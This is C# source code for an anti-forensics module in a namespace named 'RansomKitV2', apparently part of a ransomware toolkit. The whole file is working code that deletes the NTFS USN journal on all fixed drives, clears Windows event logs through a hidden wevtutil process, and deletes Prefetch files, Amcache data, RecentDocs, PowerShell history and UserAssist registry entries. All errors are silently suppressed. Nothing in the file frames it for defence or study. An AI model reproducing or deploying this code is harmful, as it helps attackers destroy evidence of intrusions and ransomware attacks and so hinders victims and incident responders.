using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace RansomKitV2
{
    internal static class AntiForensics
    {
        public static void Run()
        {
            WipeUsnJournal();
            ClearEventLogs();
            ClearPrefetch();
            ClearAmcache();
            ClearRecentDocs();
            ClearPowerShellHistory();
            ClearUserAssist();
        }

        // ---------- USN journal ----------
        private const uint GENERIC_READ = 0x80000000;
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint FILE_SHARE_READ = 0x1;
        private const uint FILE_SHARE_WRITE = 0x2;
        private const uint OPEN_EXISTING = 3;
        private const uint FSCTL_DELETE_USN_JOURNAL = 0x000900F4;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess,
            uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode,
            IntPtr lpInBuffer, uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize,
            out uint lpBytesReturned, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private static void WipeUsnJournal()
        {
            try
            {
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (drive.DriveType != DriveType.Fixed || !drive.IsReady) continue;
                    string vol = @"\\.\" + drive.Name.TrimEnd('\\');

                    IntPtr h = CreateFileW(vol, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                        OPEN_EXISTING, 0, IntPtr.Zero);
                    if (h == IntPtr.Zero || h == new IntPtr(-1)) continue;

                    IntPtr p = Marshal.AllocHGlobal(16);
                    try
                    {
                        for (int i = 0; i < 16; i++) Marshal.WriteByte(p, i, 0);
                        DeviceIoControl(h, FSCTL_DELETE_USN_JOURNAL, p, 16,
                            IntPtr.Zero, 0, out _, IntPtr.Zero);
                    }
                    finally { Marshal.FreeHGlobal(p); CloseHandle(h); }
                }
            }
            catch { }
        }

        // ---------- Event logs ----------
        private static void ClearEventLogs()
        {
            foreach (var log in new[] { "System", "Application" })
            {
                try
                {
                    var psi = new ProcessStartInfo("wevtutil.exe", $"cl {log}")
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden,
                    };
                    using var p = Process.Start(psi);
                    p?.WaitForExit(4000);
                }
                catch { }
            }
        }

        // ---------- Prefetch ----------
        private static void ClearPrefetch()
        {
            try
            {
                string dir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Prefetch");
                if (!Directory.Exists(dir)) return;
                foreach (var f in Directory.EnumerateFiles(dir, "*.pf"))
                {
                    try { File.Delete(f); } catch { }
                }
            }
            catch { }
        }

        // ---------- Amcache ----------
        private static void ClearAmcache()
        {
            try
            {
                string path = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "appcompat", "Programs", "Amcache.hve");
                if (File.Exists(path)) File.Delete(path);
            }
            catch { }

            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Services\Amcache", true);
                key?.DeleteSubKeyTree("InventoryApplicationFile", false);
            }
            catch { }
        }

        // ---------- RecentDocs ----------
        private static void ClearRecentDocs()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs", true);
                if (key == null) return;
                foreach (var sub in key.GetSubKeyNames())
                {
                    try { key.DeleteSubKeyTree(sub, false); } catch { }
                }
                foreach (var v in key.GetValueNames())
                {
                    try { key.DeleteValue(v, false); } catch { }
                }
            }
            catch { }
        }

        // ---------- PowerShell history ----------
        private static void ClearPowerShellHistory()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string dir = Path.Combine(appData,
                    "Microsoft", "Windows", "PowerShell", "PSReadLine");
                if (!Directory.Exists(dir)) return;
                foreach (var f in Directory.EnumerateFiles(dir, "*_history.txt"))
                {
                    try { File.Delete(f); } catch { }
                }
            }
            catch { }
        }

        // ---------- UserAssist ----------
        private static void ClearUserAssist()
        {
            try
            {
                using var root = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist", true);
                if (root == null) return;
                foreach (var sub in root.GetSubKeyNames())
                {
                    using var count = root.OpenSubKey(sub + @"\Count", true);
                    if (count == null) continue;
                    foreach (var v in count.GetValueNames())
                    {
                        try { count.DeleteValue(v, false); } catch { }
                    }
                }
            }
            catch { }
        }
    }
}